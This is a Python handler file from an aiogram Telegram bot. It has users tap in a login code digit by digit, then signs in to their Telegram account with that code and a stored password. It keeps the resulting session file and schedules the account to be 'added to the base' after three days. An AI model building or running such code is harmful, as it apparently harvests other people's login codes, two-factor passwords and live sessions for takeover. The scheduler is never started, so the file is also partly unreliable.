import os
import pytz
from datetime import datetime, timedelta
from aiogram.types import CallbackQuery
from aiogram.dispatcher import FSMContext

from apscheduler.schedulers.asyncio import AsyncIOScheduler
from apscheduler.triggers.date import DateTrigger

from keyboards import type_code, type_finish
from utils.client_actions import sign_in_client
from utils.others import init_worker
from config import bot, BASE_DIR


async def get_number_for_code(callback: CallbackQuery, state: FSMContext):

    digits = callback.data.split(':')[-1]

    if len(digits) < 5:

        await callback.message.edit_reply_markup(reply_markup=type_code(digits=digits))

    else:

        await callback.message.edit_text('Все верно?', reply_markup=type_finish(digits=digits), parse_mode='HTML')



async def clear_number_in_code(callback: CallbackQuery, state: FSMContext):

    digits = callback.data.split(':')[-1][0:-1]

    await callback.message.edit_reply_markup(reply_markup=type_code(digits=digits))



async def send_code(callback: CallbackQuery, state: FSMContext):

    code = callback.data.split(':')[-1]
    await callback.answer('Начинаю подготовку...')
    
    async with state.proxy() as temp:

        data = temp
    
    await state.finish()


    try:

        await sign_in_client(phone=data['phone'], code=code, password=data['password'])

    except Exception as ex:

        path = str(BASE_DIR) + '/sessions/' + str(data['user_id']) + '.session'
        os.remove(path=path)
        text = str(ex) + '\nin callbacks/type_code_handler.py in send_code'
        await bot.send_message(int(os.getenv('LOG_CHAT_ID')), text=text)
        await callback.message.answer('Произошла ошибка.')
    
    else:
        
        await callback.message.answer('Аккаунт будет добавлен в базу через 3 дня, после запланированной проверки.')

        scheduler = AsyncIOScheduler()
        date = datetime.now(tz=pytz.timezone('Europe/Moscow')) + timedelta(days=3)
        trigger = DateTrigger(run_date=date)

        job = scheduler.add_job(init_worker, [data['user_id'], data['name'], data['phone']], trigger=trigger)
        #await init_worker(str(data['user_id']), data['name'], data['phone'])

